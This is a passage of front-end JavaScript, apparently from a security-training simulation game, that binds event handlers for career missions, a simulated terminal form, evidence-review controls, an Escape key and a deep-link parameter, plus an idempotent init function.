  if (resetBtn) {
    resetBtn.addEventListener('click', () => {
      resetCareerState();
      if (careerScreenOpen()) {
        returnFromCareerMission();
      }
    });
  }

  const form = document.getElementById('simTermForm');
  if (form) {
    form.addEventListener('submit', e => {
      e.preventDefault();
      const input = document.getElementById('simTermInput');
      const raw = input ? input.value : '';
      if (input) input.value = '';
      if (typeof simRunCommand === 'function') simRunCommand(raw);
    });
  }

  // One delegated handler for every interactive control inside #careerOps.
  // Panels are re-rendered, so we bind the stable parent and route by data-attr.
  const careerOps = document.getElementById('careerOps');
  if (careerOps) {
    careerOps.addEventListener('click', e => {
      // Network map (Task #94) — review-only overlay, opens on demand.
      const mapOpen = e.target.closest('[data-map-open]');
      if (mapOpen) { openSimMap(); return; }
      // Evidence presentation (Task #91) — all presentation-only, no scoring.
      const view = e.target.closest('[data-ev-view]');
      if (view) { setEvidenceView(view.dataset.evView); return; }
      const reveal = e.target.closest('[data-ev-reveal]');
      if (reveal) { toggleEvidenceLayer(reveal.dataset.evReveal, reveal.dataset.evLevel); return; }
      const term = e.target.closest('[data-term]');
      if (term) { toggleTerm(term); return; }
      const concern = e.target.closest('[data-concern]');
      if (concern) { toggleConcern(Number(concern.dataset.concern)); return; }
      const judg = e.target.closest('[data-judgment]');
      if (judg) { setJudgment(judg.dataset.judgment); return; }
      const ident = e.target.closest('[data-identify]');
      if (ident) { setIdentification(ident.dataset.identify); return; }

      const cls = e.target.closest('[data-classify-file]');
      if (cls) { setClassification(cls.dataset.classifyFile, cls.dataset.classifyVal); return; }
      const act = e.target.closest('[data-action]');
      if (act) { chooseAction(act.dataset.action); return; }
      const locked = e.target.closest('[data-locked]');
      if (locked) { chooseLockedAction(locked.dataset.locked); return; }
      const rec = e.target.closest('[data-rec]');
      if (rec) { submitRecommendation(rec.dataset.rec); return; }
      if (e.target.closest('[data-done]')) { returnFromCareerMission(); return; }
    });
  }

  // Own Escape handler for the career Operating Center. oc.js's handler is
  // harmless when #careerOps is open (its screen checks all fall through).
  document.addEventListener('keydown', e => {
    if (e.key !== 'Escape') return;
    if (careerScreenOpen()) {
      // The network-map overlay takes Escape first, so it closes without
      // also exiting the mission underneath it.
      if (SIM.mapOpen) { closeSimMap(); return; }
      returnFromCareerMission();
    }
  });

  // Deep-link straight into a career mission for demoing / testing — mirrors the
  // legacy ?holo= / ?console= / ?lab= deep-links (e.g. /?career=mission-001).
  try {
    const careerId = new URLSearchParams(window.location.search).get('career');
    if (careerId && CAREER_MISSIONS[careerId]) openCareerMission(careerId);
  } catch (_) { /* ignore malformed query strings */ }
}

/* ------------------------------------------------------------------ *
 * Boot contract (shipping integration)
 * Do NOT self-boot on DOMContentLoaded. The host app (script.js boot()) owns
 * boot ordering and calls window.echCareerInit() AFTER progress is loaded and
 * the Operations Center is rendered. Idempotent — a double call is harmless.
 * ------------------------------------------------------------------ */
let _echCareerInited = false;
function echCareerInit() {
  if (_echCareerInited) return;
  _echCareerInited = true;
  simInit();
}
window.echCareerInit = echCareerInit;
